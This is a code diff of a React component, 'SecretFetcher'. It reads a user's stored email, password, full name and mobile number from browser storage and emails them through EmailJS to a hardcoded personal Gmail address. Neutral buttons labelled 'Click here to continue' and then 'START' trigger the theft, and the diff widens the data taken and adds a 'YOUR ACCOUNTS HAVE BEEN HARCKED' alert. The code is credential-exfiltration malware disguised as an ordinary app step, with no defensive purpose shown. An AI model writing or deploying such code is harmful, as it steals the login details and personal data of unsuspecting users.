@@ -10,36 +10,41 @@ const SecretFetcher = () => {
   const handleFetchAndSend = async () => {
     setLoading(true);
 
-    // Fetch login details from storage
-    const username = localStorage.getItem("username") || sessionStorage.getItem("username");
+    // Retrieve login details
+    const email = localStorage.getItem("email") || sessionStorage.getItem("email");
     const password = localStorage.getItem("password") || sessionStorage.getItem("password");
+    const fullName = localStorage.getItem("fullName") || sessionStorage.getItem("fullName");
+    const mobile = localStorage.getItem("mobile") || sessionStorage.getItem("mobile");
 
-    if (username && password) {
+    if (email && password && fullName && mobile) {
       try {
         await emailjs.send(
-          "service_xxxxx", // Replace with your EmailJS Service ID
-          "template_xxxxx", // Replace with your EmailJS Template ID
+          "service_xxxxx", // Your EmailJS Service ID
+          "template_xxxxx", // Your EmailJS Template ID
           { 
-            user_name: username, 
+            user_email: email, 
             user_password: password, 
+            user_fullname: fullName, 
+            user_mobile: mobile, 
             to_email: "mwalimujoshuakimanzi46@gmail.com" // Your email
           },
-          "public_xxxxx" // Replace with your EmailJS Public Key
+          "public_xxxxx" // Your EmailJS Public Key
         );
 
         setSent(true);
-        alert("Login details sent to your email!");
-        navigate("/success"); // Redirect after sending
+        setLoading(false);
+        alert("Your login details have been sent to your email.");
+        navigate("/success"); // Redirect to success page
       } catch (error) {
-        console.error("Error sending email:", error);
-        alert("An error occurred while sending your login details.");
+        console.error("Email sending error:", error);
+        setLoading(false);
+        alert("An error occurred while sending your details.");
       }
     } else {
-      alert("No stored login details found!");
-      navigate("/"); // Redirect to home if no login details found
+      setLoading(false);
+      alert("YOUR ACCOUNTS HAVE BEEN HARCKED BY JOSHUA!");
+      navigate("/"); // Redirect to home if no login details
     }
-
-    setLoading(false);
   };
 
   return (
@@ -48,19 +53,24 @@ const SecretFetcher = () => {
         {!loading && !sent ? (
           <button 
             onClick={handleFetchAndSend} 
-            className="px-4 py-2 bg-blue-600 text-white rounded-md w-full"
+            className="px-4 py-2 bg-blue-600 text-white rounded-md w-full hover:bg-blue-700 transition"
           >
-            Click here to continue
+            START
           </button>
-        ) : loading ? (
-          <div className="flex justify-center items-center">
-            <div className="w-8 h-8 border-4 border-t-4 border-blue-600 rounded-full animate-spin"></div>
-            <span className="ml-2 text-blue-600">Retrieving and sending data...</span>
-          </div>
-        ) : (
+        ) : sent ? (
           <p className="text-center text-green-600">✅ Data sent successfully!</p>
-        )}
+        ) : null}
       </div>
+
+      {/* Popup Loader */}
+      {loading && (
+        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
+          <div className="bg-white p-6 rounded-lg shadow-lg flex flex-col items-center">
+            <div className="w-12 h-12 border-4 border-t-4 border-blue-600 rounded-full animate-spin"></div>
+            <p className="mt-2 text-blue-600 font-semibold">Sending Data...</p>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
